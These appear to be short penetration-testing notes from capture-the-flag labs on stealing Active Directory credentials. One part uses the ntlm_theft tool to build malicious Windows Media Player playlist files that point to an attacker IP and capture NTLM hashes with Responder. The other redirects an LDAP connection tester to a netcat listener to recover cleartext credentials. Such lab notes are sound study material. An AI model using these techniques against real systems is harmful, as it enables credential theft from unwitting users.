# AD - thieving techniques

## AD - NTLM theft - ntlm-theft
```
# NTLM theft - ntlm-theft
upload function indicates that Windows Media Player is being used in some capacity.
A quick search for Windows Media Player file types links us to a Microsoft support post. We can further
search for some of these file types as well as how we can leverage them. One tool, ntlm_theft, can help with
this specifically.
The tool description indicates that we can generate malicious files for the following extensions:
.wax - via Windows Media Player playlist (Better, primary open)
.asx – via Windows Media Player playlist (Better, primary open)
.m3u – via Windows Media Player playlist (Worse, Win10 opens first in Groovy)

# generate the malicious files
python3 ntlm_theft.py -g all -s 10.10.14.66 -f media
Created: media/media.wax (OPEN)
Created: media/media.m3u (OPEN IN WINDOWS MEDIA PLAYER ONLY)
Created: media/media.asx (OPEN)

# start Responder in order to capture the hash of the user that opens them. Once Responder is running we can upload one of the three files we're interested in to see if we can get a response.
```

## LDAP - Recover creds from LDAP profile tester
```
ometimes, it is possible to retrieve cleartext credentials by tricking the LDAP connection tester to connect to your own Netcat listener. 
Since it is using LDAPS, however, we will need to try editingthe existing LDAP URL ldaps://authority.htb.corp:636 to use ldap:// and port 389 ,pointing it to our attacking machine's host IP instead

nc -lvnp 389
```